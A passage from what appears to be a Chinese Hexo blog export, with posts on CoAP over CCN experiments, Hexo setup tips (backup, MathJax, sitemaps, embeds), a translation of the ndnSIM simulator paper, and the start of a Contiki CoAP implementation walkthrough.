第四个实验是验证CoAP通过UDP和CoAP通过CCN提供的组通信原语的性能。图9显示了组通信的拓扑。这里，节点1是根，这表明它要向组成员3,4,5和6发送数据的。在该实验中，源节点周期性地向组成员发送消息，并且我们测量每个节点处的延迟。图10显示了基于涓流的ROLL组播路由协议，UDP单播和CCN组通信的节点的平均延迟的变化。可以看出，CCN协议具有更好的最坏情况延迟，但除此之外，它们是相当相似的。UDP单播具有更高的延迟，因为它不会从源到目的地的公共路径由于消息数量增加而受益。 讨论（1）对节能的影响：与IP模型不同，在CCN中，数据可能来自已缓存数据的任何节点。这意味着低功率设备不一定必须对于服务信息是有效的。例如，固定网络上的基础设施路由器或其他节点可以将传感器的数据缓存在其范围内。现在，可以根据需要在低功率设备上完成无线电自行车。 CoAP over IP建议使用中间件作为代理来节省电量。CCN架构可以（本质上）通过在网络中的普及缓存来避免对这个中间件的需要。 （2）安全和隐私：基于UDP的CoAP为安全性提供DTLS（数据报传输层安全）绑定。这与CCN无关，因为它提供基于内容的安全性，而不是基于IP的基于连接的安全性。这允许接收者只要其签名有效并且其内容可以通过加密来保护即可接受来自任何人的数据分组。这些属性减少了对网络中介机构的信任，但也导致了内容中毒和兴趣泛滥等新形式的攻击。隐私是CCN中需要解决的另一个重要挑战。“名称”和“内容”隐私在物联网环境中特别重要。虽然已经提出了几个反措施，但是应该更加严格地研究这些方法的可行性和影响。 （3）无线网络的影响：大多数IoT设备通常使用无线低功耗无线电。鉴于无线通信的固有广播性质，这是传播interest的有效方法，因为单个interest分组可以同时满足多个网络元素。使用定向天线和额外的元数据，还可以进行有效的地理投射。通过监听内容，节点可以在数据清醒时机会地缓存数据，并能够在高度移动的场景中进行响应。通过监听其他节点，可以发现活跃的邻居，并使用此信息来最小化interest广播。CCN优化的MAC层协议可以非常有用，需要进一步的调查。 （4）Interest有效载荷：支持interest的有效载荷允许有效地将interest超载作为推送消息。这允许支持IP式推送通信，同时保留CCN的好处。然而，interest有效载荷可能导致网络中的拥塞，当interest被洪泛。为了避免这种情况，可以在网络层采用拥塞控制机制。 （5）移动性和长存的interest：CCN可以支持移动性。然而， long-lived interests和移动性可能会导致网络中存在过时的PIT条目。这可能会增加网络的负载，除非无效。应该有机制来定期检测节点的存在/不存在，并删除不再相关的PIT条目。在通过UDP的CoAP中，支持移动性要困难得多。 总结 CCN为当前物联网架构面临的问题提供了一个干净的解决方案。使用CCN，网络可以更好地了解流量特性（通过数据名称）并进行相应的调整。它还给出了网络自组织能力。然而，CCN目前的形式不够灵活，无法捕获所有的通信模式，因此需要一种支持发布/订阅和按需内容传播的体系结构。 我们讨论了通过CCN实施CoAP的几个权衡。一个关键的结果是，稍作修改后，CoAP确实可以在CCN中实施。其性能也与IP上的CoAP相当，但在几种情况下有潜力做得更好。一个重要的未来方向是调查考虑到网络的动态性以有效地路由到内容的有效的路由协议。应避免对这些设备的电池寿命造成不利影响的不必要的开销流量和广播。]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>CoAP</tag>
        <tag>CCN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github Pages + Hexo搭建博客（四）]]></title>
    <url>%2F2017%2F08%2F10%2FGithub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Hexo的前三篇博客已经能够完整地搭建博客，此篇博客主要介绍了自己在使用Hexo期间遇到的一些问题以及解决问题的工具。 博客备份工具 一直想着怎么把博客备份一下，以便丢失时或者是换电脑时能够接着写博客，终于找到一个靠谱的插件，直接将文件备份在博客的仓库中的不同分支，十分方便。 项目地址：https://github.com/coneycode/hexo-git-backup 安装 如果hexo的版本是2.x.x则执行如下命令: 1$ npm install hexo-git-backup@0.0.91 --save 如果hexo的版本是3.x.x, 则执行: 1$ npm install hexo-git-backup --save 配置 在站点配置文件_config.yml中添加如下信息： 12345backup: type: git # 指定提交类型 message: update xxx # 添加git commit信息 repository: # 指定仓库类型和地址 github: git@github.com:xxx/xxx.git,分支名字 运行 使用 1hexo backup 或者 1hexo b 备份成功后，可以在Github上查看我们新建的备份分支。 使用Latex数学公式 Hexo默认使用”hexo-renderer-marked”引擎渲染网页，该引擎会把一些特殊的markdown符号转换为相应的html标签，比如在markdown语法中，下划线’_’代表斜体，会被渲染引擎处理为标签。 因为类Latex格式书写的数学公式下划线 ‘_’ 表示下标，有特殊的含义，如果被强制转换为标签，那么MathJax引擎在渲染数学公式的时候就会出错。例如，$x_i$在开始被渲染的时候，处理为$xi$，这样MathJax引擎就认为该公式有语法错误，因为不会渲染。 类似的语义冲突的符号还包括’*’, ‘{‘, ‘}’, ‘\’等。 进入到主题目录，找到_config.yml配置问题，把mathjax默认的false修改为true，具体如下： 1234# MathJax Supportmathjax: enable: true per_page: true 此外，还需要在文章的Front-matter里打开mathjax开关，如下： 123456---title: index.htmldate: 2017-03-28 21:01:30tags:mathjax: true-- 插入图片 前面说过使用七牛云进行图片存储，其实也可以直接使用我们的Hexo github仓库进行图片存储。 方法一：在hexo/source目录下新建一个img文件夹，将图片放入该文件夹下，插入图片时链接即为/img/图片名称 方法二：直接将图片放在public目录下对应的博客文章的目录下。 1![你想输入的替代文字](xxxx/图片名.jpg) 但是，这样做也存在一定的缺点，因为Github仓库的的大小也是受限的，所以图片太多就比较麻烦了，所以还是建议用图床等其他云存储方式。 插入音乐 网音乐云音乐，虾米音乐都可以生成内嵌音乐的html代码，在其网页端找到喜欢的歌曲，点击分享按钮，把里面的代码复制下来，直接粘贴到博文中即可: 123&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=330 height=86 src=&quot;http://music.163.com/outchain/player?type=2&amp;id=450853439&amp;auto=1&amp;height=66&quot;&gt; &lt;/iframe&gt; 插入视频 将优酷等视频平台提供的视频外链或者自己制作的视频外链替换掉如下src的值即可。 12345&lt;iframe height=498 width=510 src=&quot;http://player.youku.com/embed/XNjcyMDU4Njg0&quot; frameborder=0 allowfullscreen&gt; &lt;/iframe&gt; 百度/google收录你的站点安装sitemap插件12npm install hexo-generator-sitemap --save # googlenpm install hexo-generator-baidu-sitemap --save # 百度 在站点配置文件_config.yml中添加如下代码： 12345# 自动生成sitemapsitemap: path: sitemap.xmlbaidusitemap: path: baidusitemap.xml 执行hexo -g后会在public目录下生成baidusitmap.xml 和 sitemap.xml两个文件。 Hexo 3.xx版本的问题 Hexo 3.0 把服务器独立成了个别模块，您必须先安装 hexo-server 才能使用。 1$ npm install hexo-server --save 安装完成后，输入以下命令以启动服务器，您的网站会在 http://localhost:4000 下启动。在服务器启动期间，Hexo 会监视文件变动并自动更新，您无须重启服务器。 然后，通过如下命令可开启本地预览： 1$ hexo server 或者 1hexo s 如果您想要更改端口，或是在执行时遇到了 EADDRINUSE 错误，可以在执行时使用 -p 选项指定其他端口，如下： 1$ hexo server -p 5000]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]ndnSIM：NDN simulator for NS-3]]></title>
    <url>%2F2017%2F07%2F22%2F%E8%AF%91-ndnSIM%EF%BC%9ANDN-simulator-for-NS-3%2F</url>
    <content type="text"><![CDATA[ndnSIM：NDN simulator for NS-3（全文翻译） 1 Alexander Afanasyev, Ilya Moiseenko, and Lixia Zhang 摘要：命名数据网络是一种新提出的网络体系结构。NDN保持了因特网的沙漏结构，但发展了细腰部分。代替推送数据到特定位置，NDN通过名字获取数据。一方面，这个简单的改变允许NDN网络使用几乎所有因特网经过良好测试的工程属性，意图不仅仅解决IP通信问题，而且解决数字分发和控制问题。另一方面，分布式体系结构与今天因特网的点对点通信结构存在根本上的差异，这带来了许多新的研究挑战。模拟器可以充当灵活的工具来检验和评估新体系结构的各个方面。为了提供提供给整个研究团体通用的模拟平台，我们开发了基于NS-3的开源模拟器，ndnSIM，来以模块化方式真实地实现NDN网络的基本组件。本文提供了一个ndnSIM的概述。 引言 命名数据网络对因特网通信范式引入的根本性改变要求对NDN设计的各个方面广泛的多维度的评估。尽管现存的NDN的实现（CCNx项目）和测试床的部署为NDN基础设施设计及其在现实环境中的应用评估提供了宝贵的机会，但还是难以尝试使用不同的设计选项，并且无法评估大规模部署中的设计选择。为了满足这样的需求，并向广大社区提供一个共同的实验平台，我们开发了基于NS-3网络仿真器框架的开源NDN模拟器ndnSIM。 ndnSIM的设计具有下面的目标： 作为一个开源的包，允许研究团体在一个共同的模拟平台上运行实验。 能够如实地模拟所有的基本NDN协议操作。 维持CCNx实现中包级别的互操作性，允许共享CCNx和ndnSIM之间的流量测量和包分析工具，并直接使用真实的CCNx流量轨迹来驱动ndnSIM模拟实验。 能够支持大规模模拟实验。 在网络层实验中增加路由、数据缓存、包转发和拥塞管理。 遵循NDN体系结构，ndnSIM作为一个新的网络层协议模型实现，可以运行在任何可用的链路层协议模型（点对点，CSMA，无线等）、网络层协议模型（IPv4，IPv6）和传输层协议模型（TCP,UDP）之上。这种灵活性允许ndnSIM模拟各种各样的同构场景和异构部署场景（例如，仅有NDN的、在IP之上的NDN等）。 模拟器以模块化形式实现，使用单独的C++类集来建模NDN中每个网络层实体的行为：待定兴趣表（PIT）、转发信息表（FIB）、内容缓存（CS）、网络和应用程序接口、兴趣表转发策略等。这个模块化结构允许任何组件被容易地修改或替换，而对其他组件没有或有最小影响。另外，模拟器提供了大量的接口和辅助器集合，来执行每个组件和NDN交通流详细的跟踪行为。 我们在2011年秋天开始了ndnSIM的实现工作。自此，初始的ndnSIM实现被我们自己和一些外部的alpha测试者用于各种各样的NDN设计和评估任务。与此同时，我们继续积极地进行ndnSIM的开发，ndnSIM的第一个发布版本从2012六月份开始作为一个可用的开源包。我们希望ndnSIM成为广大对NDN研究感兴趣的团体一个有用的工具，研究团体可以向我们提供非常重要的bug报告和新特性开发的反馈。更多关于发布版的细节信息，代码下载，基本例子和额外的文档可以访问ndnSIM站点http://ndnsim.net/。 设计 创建开源的NDN模拟包的愿望极大地促进了我们选择NS-3网络模拟器作为ndnSIM基本框架。尽管NS-3相对比较新，并且仍然不具有商业的Qualnet或者之前的ns-2模拟器拥有的所有东西（例如，NS-3没有模拟传统动态IP路由协议的本地支持），它提供了一个干净一致的设计，丰富的文档和灵活的设计。 在这部分，我们提供了关于ndnSIM设计的主要组件的描述，包括协议实现组件的描述。 设计概述 ndnSIM的设计遵从NS-3中网络模拟器的设计哲学，为所有的模型化组件设计最大化抽象。与现存的IPv4和IPv6协议栈相似，我们设计ndnSIM作为一个独立的协议栈，可以被安装在模拟网络节点上。除了核心协议栈，ndnSIM包括了大量的基本流量发生器应用程序和辅助器类来简化模拟场景的创建（例如，在节点上安装NDN协议栈和应用程序的辅助器）以及用于收集用于测量目的的模拟统计信息的工具。 下面的列表汇总了在ndnSIM上实现的组件层抽象；图1虚拟了他们之间的基本交互： ndn::L3Protocol：核心NDN协议交互的实现：通过接口从上层和下层接收兴趣包和数据包； ndn::Face：对应用程序（ndn::AppFace）和其他模拟节点（ndn::NetDeviceFace）之间的一致通信的抽象，拥有可选的可插拔的链路层拥塞缓解模块的支持； ndn::ContentStore：数据包的网络内存储的抽象（例如，短期瞬变现象，长期瞬变现象，长期持久现象）。 ndn::Pit：待定兴趣表（PIT）的抽象，记录了接收到兴趣包接口的前缀，兴趣包转发到的接口和之前见到的兴趣包随机数。 ndn::Fib：转发信息表（FIB）的抽象，可以通过转发策略用于指导兴趣包转发。 ndn::ForwardingStrategy：兴趣包和数据包转发的抽象和核心实现。ndn::ForwardingStrategy中转发过程的每一步——包括CS、PIT、FIB的查询和依据PIT条目转发数据包——代表虚拟函数调用，可以在特定的转发策略实现类中被重写（见2.7节）。 参考NDN应用程序，包括简单的流量生成器和接收器模块。 每个组件拥有大量除了核心ndn::L3Protocol之外的替代实现，模拟场景可以通过使用helper类任意选择这些实现（见ndnSIM在线文档http://ndnsim.net/helpers.html）。例如，ndnSIM当前提供了LRU、FIFO和随机替换缓存数据策略的抽象实现。 当前兴趣包和数据包的有线格式遵循现存的CCNx项目的NDN实现格式（CCNx二进制XML编码）。尽管这个设计选择强加了额外的负载（例如，二进制XML解码和编码过程有自己的开销），它允许重用现有的流量分析工具（ndndump， wireshark ccn plugin），并允许使用真实的CCNx流量轨迹驱动模拟。之后，我们将提供一个选项来禁用兼容的包格式，这将允许在运行大规模模拟实验时保存资源。 ndnSIM的设计包含大量的可选模块，包括（1）数据安全的占位符（当前的代码允许向数据包附加用户指定的签名），（2）负反馈的实验支持（兴趣包NACK）来提供关于数据面板问题的快速反馈，（3）可插拔的兴趣包速率限制和接口可用性组件，（4）可扩展的统计模块。对兴趣包NACK和兴趣包速率限制感兴趣的读者可以查阅文献[5]获取详细信息。 核心的NDN协议实现 ndn::L3Protocol在ndnSIM中是一个中心体系架构实体，与类层次站在同一条水平线上作为响应NS-3框架的Ipv4L3Protocol和Ipv6L3Protocol类，实现IPv4和IPv6网络层协议。ndn::L3Protocol是一个应用程序和其他节点（接口抽象，见2.3节）的所有可用通信信道的逻辑组件聚合器，并且执行从接口进来的包的基本处理。 ndn::L3Protocol类定义API来操纵下面的NDN栈的实现： 添加接口/移除接口：向NDN协议注册一个新的接口实现或者移除一个现存接口。 接口抽象 为了实现我们的目标，提供最大的灵活性和可扩展性，我们的ndnSIM设计通过抽象层间交互独立于底层的传输。也就是说，所有的核心协议实现（ndn::L3Protocol），网络和应用程序之间的通信通过一个接口抽象（ndn::Face）完成，可以被以各种形式实现（见图2）：节点间通过链路层直接通信的链路层接口（ndn::NetDeivceFace）、节点间通过覆盖网通信的网络层接口（ndn::Ipv4Face和ndn::Ipv6Face）和传输层接口（ndn::TcpFace和ndn::UdpFace），节点内通信的应用层接口（ndn::AppFace）。 在第一版中，我们当前的ndnSIM包仅提供链路层ndn::NetDeviceFace和应用层ndn::AppFace。通过这两个接口，我们可以模拟一个完全允许NDN的网络。增加其他类型的接口很简单，我们期望一旦需要模拟更加复杂的场景，我们自己或者研究团体的其他人就可以添加其他类型的接口（例如，NDN节点和不运行NDN协议的节点混杂）。 接口抽象定义了下面的API： （1）SendImpl（特定实现）：从NDN协议栈传递包到底层（网络或应用程序）。 （2）RegisterProtocolHandler（特定实现）：允许从底层（网络层或应用层）转发包到NDN栈。 （3）SetMetric/GetMetric：在路由计算中分配并得到可以使用的接口度量。 （4）IsUp/SetUp：检查接口是否是启用的，来启用/禁用接口。 除了基本的API，接口抽象提供了方法来存储可以被转发策略模块使用的任意信息。例如，ndn::fw::SimpleLimits兴趣包转发策略实现了对基于物理链路限制的兴趣包的数量。 内容缓存抽象 每个NDN路由器的内容缓存允许网络内存储，提供了高效的错误恢复和异步多播数据交付。ndnSIM提供了一个接口插入不同的内容缓存的实现，可以实现不同的索引和项目查询设计，不同大小限制的特征，和不同缓存替换策略。 当前ndnSIM的版本包含内容缓存抽象的三个实现：最近最少使用（ndn:;cs:;Lru）、先进先出（ndn:;cs::Fifo）、随机替换策略（ndn::cs::Random）。每个实现是基于查找树的动态容器，拥有可选上界的大小和数据包名字中拥有基于哈希的索引（每个组件在查找树上查询）。其他内容缓存模块可能或者被我们自己实现，或者在需要的时候在其他研究团体的帮助下实现。 内容缓存抽象提供了下面的操作： （1） 添加（特定实现）：在缓存中缓存新的数据包或者更新现存的数据包。 （2） 查询（特定实现）：执行查询之前缓存的数据包。 内容缓存抽象不提供明确的数据移除操作。内容缓存条目的生存时间依赖于流量模型，并依赖于数据生产者提供的数据包新鲜度参数。 待定兴趣表抽象 PIT（ndn::Pit）为每个转发的兴趣包维护状态，以便为数据包转发提供方向。每个PIT条目包含下面信息： 与名字相关的条目； 进接口列表，从该接口接收到那个名字的兴趣包，拥有相关信息（例如，该接口上兴趣包的到达时间）； 出接口列表，兴趣包被转发到的接口，拥有相关信息（兴趣包在该接口上被发送的时间，该接口上兴趣包重传的数量等）。 条目到期时间（所有接收到的相同名字的兴趣包中的最大生存时间）。 任何其他特定转发策略信息以转发策略标签的形式（任何源自于ndn::fw::Tag的类）。 当前ndnSIM的版本提供了一个模板化的PIT抽象的实现，可以选择PIT条目数量的边界和不同的替换策略，包括： （1） 坚持（ndn::pit::Persistent）——如果PIT大小达到限制，新条目将被拒绝。 （2） 随机（ndn::pit::Random）——当PIT大小达到限制，随机条目（可能是新创建的条目）将被从PIT中移除； （3） 最近最少使用（ndn;:pit::Lru）——当PIT大小达到限制时，最近最少使用条目（进接口中最小数量的最老条目）将被移除。 所有当前的PIT实现在基于查找树的数据结构中组织，数据包名字中拥有基于哈希表的索引（每个组件在查找树中查询），额外的时间索引（通过到期时间）将从PIT中移除超时兴趣包进行了优化。 新的PIT条目由具有唯一名字的每个兴趣包创建。当该名字的兴趣包之前已经被接收，现存PIT条目的进接口列表因此被更新，高效地聚合（抑制）了相似的兴趣包。 PIT抽象提供了下面的特定实现操作： （1） 查找：为兴趣包或数据包的特定内容名字找到一个相应的PIT条目。 （2） 创建：为给定的兴趣包创建一个新的PIT条目。 （3） 标志擦除：移除标志的PIT条目。 （4） 获得大小，开始，结束，下一步：得到PIT中条目的数量，并循环访问条目。 转发信息表 NDN路由器的FIB与IP路由器中的FIB大致相似，除了它包含名字前缀而不是IP地址前缀，它通常显示了每个名字前缀的多个接口。它被用于转发策略来做出兴趣包转发决定。 当前FIB的实现（ndn:;fib::FibImpl）在基于查找树的数据结构中组织，拥有基于哈希表的索引的数据包名字（在查找树中查找每个组件），每个条目包含一个前缀和一个有序出接口列表，通过该出接口，前缀是可达的。接口的顺序定义为一个合成索引，结合接口的路由度量和数据面板反馈。匹配的查询以最长前缀匹配方式在一个可变长度的前缀上执行。 FIB总体 当前，ndnSIM提供了几种方法来在FIB中填充条目。首先，我们可以使用一个模拟脚本来在模拟设置中为每个节点手动配置FIB。这种方法使得用户可以对出现在FIB中的条目进行完全控制，这对于小规模模拟实验工作得很好。然而，它可能对拥有大型拓扑的模拟实验不可行。 第二种方法是使用一个中心的全局NDN路由控制器来自动地填充所有路由器的FIB。当请求的（或者在模拟实验运行开始之前，或者在模拟实验期间的任何时间），全局的路由控制器获得关于所有现存节点的信息，这些信息包括已安装的NDN栈，和所有的出口前缀，并使用该信息来计算每个节点对之间的最短路径，并更新所有的FIB。Boost.Graph库（http://www.boost.org/doc/libs/release/libs/graph）被用在计算中。 在当前的版本中，全局路由控制器使用Dijkstra最短路径算法（使用接口度量）并为每个名字前缀仅安装一个单独的出接口。为了在多路径兴趣包转发场景中做实验，全局路由控制器需要被扩展来填充多个条目的每个前缀。然而，它由特定的模拟实验负责来为多个条目定义精确的依据，例如，是否条目应该代表没有共同链路的路径。我们欢迎建议和/或全局路由控制器扩展，这可以被提交在GitHub站点上（https://github.com/NDN-Routing/ndnSIM）。 最后，一个简单的填充FIB的方法是安装默认路由（路由到/），包括NDN栈的所有可用接口。例如，这种方法可用于探索在没有任何来自路由面板指导的情况下兴趣转发策略如何能够找到并维护路径到前缀的模拟。 转发策略抽象 我们的设计允许各种类型转发策略的实验，不需要任何对核心组件的修改。这个目标是在一个类似事件的样式中通过引入转发策略抽象（ndn::ForwardingStrategy）来实现的，这个抽象实现了兴趣包和数据包转发的核心操作。换句话说，兴趣包和数据包处理的每一步，包括内容缓存、PIT、FIB查询，表示为一个虚函数，可以在特定转发策略实现类中被重写。 更具体地说，转发策略抽象提供了下面的可重写动作集： OnInterest：CcnxL3Protocol为每个进来的兴趣包调用该函数。 OnData：CcnxL3Protocol为每个进来的数据包调用该函数。 WillErasePendingInterest：在PIT条目被移除之前运行。 RemoveFace：调用来移除到接口的引用（如果该引用被转发策略实现使用）。 DidReceiveDuplicateInterest：检测到的重复兴趣包被接收后运行。 DidExhaustForwardingOptions：当转发策略耗尽所有的转发可选项来转发兴趣包时运行。 FailedToCreatePitEntry：当创建PIT条目的尝试失败时运行。 DidCreatePitEntry：成功地创建PIT条目的尝试之后运行。 DetectRetransmittedInterest：检测到重传的兴趣包之后运行。这甚至是可选的，仅当“检测重传”选项在场景中允许时运行。重传兴趣包的检测基于匹配现存PIT条目的新的兴趣包到达接口时，该接口记录进来条目的列表。更多细节请参考源代码。 WillSatisfyPendingInterest：待定兴趣包被数据包满足之前被运行。 SatisfyPendingInterest：满足待定兴趣包的实际过程。 DidSendOutData：每一次数据包被成功地发送出接口时运行（在拥塞期间或者速率限制模块允许时将失败）。 DidReceiveUnsolicitedData：每次数据包到达时运行，但该数据包名字没有相应的待定兴趣包时运行。如果“缓存未经请求的数据包”选项可用，这样的数据包将被作为默认处理缓存。 ShouldSuppressIncomingInterest：兴趣包抑制逻辑的钩子。 TrySendOutInterest：在接口上实际发出兴趣包之前运行。 DidSendOutInterest：在接口上成功地发出兴趣包之后运行。 PropagateInterest：基本的兴趣包传播逻辑。 DoPropagateInterest（特定实现）：特定实现的兴趣包传播逻辑。 我们期望未来发布更多可以添加到转发策略抽象的事件。同时，额外的事件将通过类继承以面向对象形式被创建。例如，兴趣包NACK扩展（更多细节见文献[5]）作为转发策略抽象的局部特征实现。 图3显示了当前可用转发策略扩展的部分层次（NACK，GreenYellowRed），完全转发策略实现（Flooding, SmartFlooding, BestRoute）可以用于模拟场景中。而所有当前的实现继承自Nack扩展，实现了额外的处理和事件来检测和处理兴趣包NACK，NACK处理默认禁用，可以使用“EnableNACK”选项将其打开。 智能洪泛和最佳路由实现依赖于每个接口状态的颜色编码，基于观察到的数据平面反馈。 绿：接口正确工作（例如，如果兴趣包被发送到该接口，数据包返回）； 黄：接口的状态未知（例如，它可能被最近添加，或者一段时间未被使用）； 红：接口不工作，不应该被用作兴趣包转发。 状态信息被附加到FIB条目中的每个接口，并首先被初始化到黄状态。每次数据包作为对之前兴趣包的响应被返回，FIB条目中相应的接口被设置为绿色。每次错误发生（PIT条目超时，或者，如果可能，NACK兴趣包被接收），接口返回黄色状态。如果接口足够长时间没有使用，它返回黄色状态。当低层通知NDN栈一个问题（链路失败，连接错误等），红色状态被分配到接口上。 下面的列表在当前可用的完全转发策略实现中汇总了处理逻辑： 洪泛策略（ndn::fw::Flooding）：兴趣包转发到该兴趣包前缀的FIB条目的所有可用接口，除了那个兴趣包的进接口。 智能洪泛策略（ndn::fw:;SmartFlooding）：如果FIB条目包含至少一个绿色接口，兴趣包仅仅转发到最高排名的绿色接口。否则，所有的黄色接口将被用于转发兴趣包。红色接口不用于兴趣包转发。 该策略模式可以用在模拟实验中，没有路由输入，数据面板可以使用兴趣包来发现和维持工作路径。 最佳路由策略（ndn::fw::BestRoute）：转发兴趣包到最高排名的绿色（如果可用）或者黄色接口。红色接口不用于兴趣包转发。 也存在一个实验性的简单限制转发策略（从ndn::fw::BestRoute继承绝大多数动作），尝试在网络中避免拥塞，并在接口选择过程中通过考虑兴趣包速率限制来最大化网络利用率。例如，如果最高排名接口达到其容量，更特别地，这个接口待定兴趣包的数量达到设定的最大限制——策略将在排序中选择低于限制的下一个接口。 除了已经实现的策略之外，我们也致力于实现额外的兴趣包转发策略，包括精确建模CCNx实现项目的行为的策略。 参考应用程序 应用程序使用接口抽象的实现ndn::AppFace与系统的核心相互交互。为了简化特定NDN应用程序的实现，ndnSIM提供了一个ndn::App基类，关注于创建ndn::AppFace，并在NDN协议栈内部进行注册，也为进来的兴趣包和数据包提供了默认处理。 下面列出的是在ndnSIM中当前可用的应用程序的集合： （1） ndn:;ConsumerCbr：一个应用程序产生拥有预定义频率的兴趣包流量（恒定速率、拥有随机一致分发的兴趣包间间隙的恒定平均速率，以指数方式随机等）。生成的兴趣包的名字包含一个可配置的前缀和一个序列号。当特定的交集在一个RTT的超时时间内没有满足（与TCP RTO相同），该兴趣包将被重传。 （2） ndn::ConsumerBatches：一个开关形式的应用程序在模拟实验的特定点生成特定数量的兴趣包。名字和重传逻辑与ndn::ConsumerCbr应用程序相似。 （3） ndn::Producer：一个简单的兴趣包汇聚应用程序，用特定大小和与兴趣包中相同的名字的数据包回复每个进来的兴趣包。 相关工作 过去的一些年里，我们的NDN体系结构研究努力致力于开发可以评估的基础设施。 NDN项目组一个正在进行的工作致力于开放网络实验室（ONL）对于NDN的支持。ONL当前包含14个可编程的路由器，超过100个客户端节点，被链路和各种容量的交换机连接。每个节点和路由器运行CCNx项目的NDN实现。用户可以完全访问ONL的任何节点的硬件和软件状态。在DeterLab 测试床的节点上运行和评估项目CCNx NDN实现也是可能的。拥有可编程的非虚拟化的测试床是一个非常有价值的选择，尽管它的容量被限制来评估相对小的网络。对大规模实验，研究者可能需要依靠模拟实验。 Rossi和Rossini开发了ccnSim来评估NDN的缓存性能。ccnSim是一个NDN的数据块级可扩展模拟器，在Omnet++框架下用C++编写，允许在大规模场景中评估NDN性能（达到106数据块），运行于标准的消费者级计算机硬件上。ccnSim的主要目标是为NDN路由器内容缓存运行不同缓存替换策略的实验。因而，它不是现存NDN协议的完全特征的实现。在ccnSim的当前版本中，PIT和FIB组件以最简单的方式实现，因此不能评估不同的数据转发策略，不同的路由策略或者不同的拥塞控制方案。 另一个NDN模拟器被Muscariello和Gallo写于Orange实验室。他们的内容中心网络包级模拟器（CCNPL-Sim）基于SSim，是一个实现了简单离散事件模拟器的通用库。结合广播和基于内容的路由方案（CBCB）必须作为SSim和CCNPL-Sim之间的中间层运行，来在一般的点对点网络上允许基于名字的路由和转发。尽管一个权威的NDN模型在CCNPL-Sim上用C++完全重新实现，这个解决方案有使用定制的离散事件模拟器的缺点，该模拟器对绝大多数研究者来说都不熟悉。另外，CBCB的强制使用限制了可能的实验领域，使得评估其他路由协议成为不可能，比如OSPF-N（OSPF扩展用于NDN），或者关于双曲度量空间的路由。 一个完全不同的方法被Urbani等人采纳。他们为NS-3模拟器中的项目CCNx NDN实现提供对于直接代码执行（DCE）的支持。DCE NS-3模块的总体目标是提供设施在NS-3模拟环境中执行现存的用户空间和内核空间的网络协议的实现。该方法主要的优势是模拟实验可以直接使用现存的未修改的CCNx节点，因此提供最大的可实现性，并不需要代码维护（作为可以运行在DCE NS-3上的新版本，而不需要更多工作）。然而，这种方法带来了一些问题。首先，真实的实现，包括项目CCNx代码，相当复杂，很难修改来探索不同的设计方法，包含了与模拟评估不相关的大量代码。第二，存在一个已知的规模问题，因为每个模拟节点必须运行一个复杂的DCE层和一个完全大小的真实CCNx实现。 总结 ndnSIM设计为一个松散边界组件集，给研究者机会来修改或替换任何组件，对ndnSIM的其他部分没有或有很小影响。我们的模拟器提供了一个参考应用程序和帮助类的集合，允许在许多不同的场景中评估NDN协议的多个方面。ndnSIM的第一版在2012年6月被公开发布，更多关于发布版和其他文档的详细信息可以访问ndnSIM网站http://irl.cs.ucla.edu/ndnSIM/。 我们希望研究团体认可ndnSIM是有用的，我们期待研究团体的反馈来帮助更多地改进它。]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>NDN</tag>
        <tag>ndnSIM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki中CoAP协议实现（上）]]></title>
    <url>%2F2017%2F07%2F16%2FContiki%E4%B8%ADCoAP%E5%8D%8F%E8%AE%AE%E5%AE%9E%E7%8E%B0%EF%BC%88%E4%B8%8A%EF%BC%89%2F</url>
    <content type="text"><![CDATA[CoAP(Constrained Application Protocol)协议是为物联网中资源受限设备制定的应用层协议。 CoAP协议简介 CoAP(Constrained Application Protocol)协议是为物联网中资源受限设备制定的应用层协议。CoAP旨在轻松转换为HTTP，以简化与Web的集成，同时满足组播支持，非常低的开销和简单性等特殊要求。 CoAP可以在大多数支持UDP的设备上运行。CoAP使用两种消息类型，请求和响应，使用简单的二进制基本头文件格式。基本标题后面可以是优化的类型长度值格式的选项。默认情况下，CoAP绑定到UDP，并可选择为DTLS（数据报传输层安全），提供高水平的通信安全性。 逻辑上分为Message和Request/Response两层（如下图），Request/Response通过Message承载，从封包上不体现这种层次结构。 REST REST(Representational State Transfer，表述性状态转移)依赖于无状态的、客户机-服务器，可缓存的通信协议。 RESTful Web服务的关键抽象就是资源而不是服务。一般来说，传感器，执行器和控制系统可以优雅地表现为通过RESTful Web服务暴露的资源及其服务。 RESTful应用程序使用类似HTTP的请求来发布数据（创建和/或更新），读取数据（例如查询）和删除数据。因此，REST对所有四个CRUD（创建/读取/更新/删除）操作都使用HTTP。 CoAP API Contiki的CoAP实现基于Erbium（Er），一种低功耗的Contiki的REST引擎。 REST引擎包括一个全面的嵌入式CoAP实现，成为Contiki中的官方。 CRU(create, read, update, delete)操作： POST: Create a resource GET: Retrieve a resource PUT: Update a resource DELETE: Delete a resource 服务器上有各种可用的资源。服务器上的每个资源都有一个处理函数，REST层调用它来为客户端的请求提供服务。REST服务器将请求的内容发送回客户端。 RESTful资源定义1234567891011121314151617/* data structure representing a resource in REST */struct resource_s &#123; struct resource_s *next; /* for LIST, points to next resource defined */ const char *url; /*handled URL */ rest_resource_flags_t flags; /* handled RESTful methods */ const char *attributes; /* link-format attributes */ restful_handler get_handler; /* handler function */ restful_handler post_handler; /* handler function */ restful_handler put_handler; /* handler function */ restful_handler delete_handler; /* handler function */ union &#123; struct periodic_resource_s *periodic; /* special data depending on flags */ restful_trigger_handler trigger; restful_trigger_handler resume; &#125;;&#125;;typedef struct resource_s resource_t; 五种RESTful资源类型 RESOURCE normal resource，由与资源处理函数相关联的静态Uri-Path定义。这是所有其他资源类型的基础。 12#define RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler) \ resource_t name = &#123; NULL, NULL, NO_FLAGS, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; NULL &#125; &#125; PARENT_RESOURCE parent resource，通过评估可能长于父资源的Uri-Path来管理多个子资源。 12#define PARENT_RESOURCE(name, attributes, get_handler, post_handler, 